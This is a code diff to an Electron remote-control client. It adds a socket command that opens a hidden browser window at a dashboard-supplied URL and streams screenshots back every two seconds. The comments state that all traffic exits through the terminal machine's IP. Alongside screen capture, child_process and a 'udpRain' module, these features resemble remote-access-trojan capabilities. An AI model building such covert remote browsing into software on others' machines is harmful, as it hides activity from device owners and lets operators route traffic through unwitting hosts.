@@ -1,4 +1,4 @@
-const { desktopCapturer, screen, app, ipcMain } = require("electron");
+const { desktopCapturer, screen, app, ipcMain, BrowserWindow } = require("electron");
 const io = require("socket.io-client");
 const child_process = require("child_process");
 const udpRain = require("./udpRain");
@@ -13,6 +13,9 @@ const info = require("./config");
 class RemoteControl {
   constructor() {
     this.mainWindow;
+    // Remote browser için ek pencereler
+    this.remoteBrowserWindow = null;
+    this.remoteBrowserInterval = null;
   }
   getCamDataWeb = (data) => {
     console.log({ getCamDataWeb: data });
@@ -170,6 +173,80 @@ class RemoteControl {
     this.socket.on("click", (data) => {
       //robot.mouseClick()
     });
+
+    /**
+     * Remote Browser
+     * Dashboard'tan gelen istekle, terminal üzerindeki Electron içinde
+     * gerçek bir BrowserWindow açılır. Bütün HTTP/HTTPS trafiği bu makineden çıkar.
+     */
+    this.socket.on("remoteBrowserOpen", (data) => {
+      // data: { from, to, url }
+      this.openRemoteBrowser(data);
+    });
+  };
+
+  /**
+   * Uzak tarayıcıyı aç ve periyodik olarak ekran görüntüsü al.
+   * Tüm trafik terminal makinenin IP'si üzerinden gider.
+   */
+  openRemoteBrowser = (data) => {
+    const targetUrl = data.url;
+
+    // BrowserWindow yoksa oluştur
+    if (!this.remoteBrowserWindow || this.remoteBrowserWindow.isDestroyed()) {
+      this.remoteBrowserWindow = new BrowserWindow({
+        width: 1024,
+        height: 768,
+        show: false, // gizli pencere, sadece ekran görüntüsü için
+        webPreferences: {
+          nodeIntegration: false,
+          contextIsolation: true,
+          sandbox: true,
+        },
+      });
+    }
+
+    // URL'yi yükle
+    this.remoteBrowserWindow.loadURL(targetUrl).catch((err) => {
+      console.error("Remote browser load error:", err);
+    });
+
+    // Eski interval varsa temizle
+    if (this.remoteBrowserInterval) {
+      clearInterval(this.remoteBrowserInterval);
+      this.remoteBrowserInterval = null;
+    }
+
+    // Periyodik olarak ekran görüntüsü al ve dashboard'a gönder
+    const captureFn = () => {
+      if (!this.remoteBrowserWindow || this.remoteBrowserWindow.isDestroyed()) {
+        if (this.remoteBrowserInterval) {
+          clearInterval(this.remoteBrowserInterval);
+          this.remoteBrowserInterval = null;
+        }
+        return;
+      }
+
+      this.remoteBrowserWindow.webContents
+        .capturePage()
+        .then((image) => {
+          const src = image.toDataURL(); // data:image/png;base64,...
+          const payload = {
+            from: data.from,
+            to: data.to,
+            url: targetUrl,
+            src,
+          };
+          this.socket.emit("remoteBrowserFrame", payload);
+        })
+        .catch((err) => {
+          console.error("Remote browser capture error:", err);
+        });
+    };
+
+    // İlk capture biraz gecikmeli (sayfa yüklensin)
+    setTimeout(captureFn, 2000);
+    this.remoteBrowserInterval = setInterval(captureFn, 2000);
   };
 }
 
